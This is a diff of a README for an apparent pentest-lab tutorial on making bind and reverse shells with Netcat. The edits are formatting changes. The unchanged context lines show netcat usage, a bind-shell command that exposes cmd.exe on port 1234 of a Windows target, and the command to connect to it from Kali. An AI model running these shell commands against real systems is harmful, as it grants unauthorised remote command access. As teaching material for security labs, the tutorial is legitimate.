@@ -1,8 +1,9 @@
 # Binding-Shell-and-reverse-Shell-with-Netcat
-Let's see how to Binding Shell and reverse Shell with Netcat
+Let's see how to Binding Shell and reverse Shell with Netcat <br>
+## Netcat
 Netcat is a command-line utility that reads and writes data across network connections, using the TCP or UDP protocols. It is also known as “the Swiss Army knife of TCP/IP networks” because it can perform many functions such as port scanning, file transfer, chat, and HTTP request. Netcat can operate in both server and client modes.
 
-## Netcat
+## Usage
 connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
 listen for inbound:     nc -l -p port [-options] [hostname] [port]
 
@@ -39,7 +40,8 @@ Follow my repository (https://github.com/SavioFengGit/Trasferring-Malicious-Payl
 
 ## Bind a Shell 
  - nc.exe -nvlp 1234 -e cmd.exe (Windows in listening)<br>
-<img src="nct.png" width=70% height="auto"><br>
+<img src="nct.png" width=70% height="auto"><br><br>
+
 We can now connect to the Target system from the Kali Linux system by running the following command: 
  - nc -nv 10.3.27.30 1234 (connect to the target)
  - systeminfo (check that we are into the Windows Machine)<br>
